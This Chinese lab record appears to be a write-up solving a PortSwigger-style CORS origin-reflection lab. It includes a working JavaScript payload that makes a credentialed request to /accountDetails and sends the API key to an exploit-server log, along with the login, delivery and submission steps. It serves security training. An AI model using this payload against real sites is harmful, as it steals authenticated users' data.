---
title: "records/lab-cors-basic-origin-reflection"
---

# records/lab-cors-basic-origin-reflection

# records/lab-cors-basic-origin-reflection

## 面
认证 JSON 面是 `GET /accountDetails`(页面 `/my-account?id=wiener` 实际由它供数据)。响应头把请求 `Origin` 原样回显进 `Access-Control-Allow-Origin`,并带 `Access-Control-Allow-Credentials: true`。

## 判据(件)
登录后 `http_dump <lab>/accountDetails --header 'Origin: https://evil.example' --jar <jar>` -> `access-control-allow-origin: https://evil.example` 且 `access-control-allow-credentials: true`,漏洞成立。

## 利用链
1. `http_session get <lab>/login` 取 csrf(会话落 jar),`post /login` 投 `csrf/username=wiener/password=peter`,302 `/my-account` = 登录成功。
2. exploit server STORE:响应体
   `<script>var r=new XMLHttpRequest();r.onload=function(){location='https://<exploit>/log?key='+encodeURIComponent(this.responseText)};r.open('get','<lab>/accountDetails',true);r.withCredentials=true;r.send();</script>`
3. `formAction=DELIVER_TO_VICTIM` 且 `--follow`(302 到 `/deliver-to-victim` 才算唤起受害者);受害者在 `/exploit/` 首访即执行脚本。
4. `GET <exploit>/log` 读访问日志:`/log?key=<urlencoded JSON>` 解出 `apikey`。
5. `POST <lab>/submitSolution answer=<apikey>` -> `{"correct":true}`,`banner_verdict` 见 `Congratulations, you solved the lab!`。

## 平台要点
- STORE 三字段 `responseFile`/`responseHead`/`responseBody` 必填,外加 `urlIsHttps=on`;`responseFile` 空值报 `File must start with /`,根路径 `/` 报 `footgun detected`;默认 `/exploit` 可用。STORE 成功判据 = 200 且表单回显所存 body。
- 访问日志用 `GET /log` 读,不要用 POST `formAction=ACCESS_LOG`(会覆盖已存载荷)。
- `responseHead` 只吃状态行 + 一个头,多一行会把文件清空。

evidences: [[portswigger-platform-specifics]]
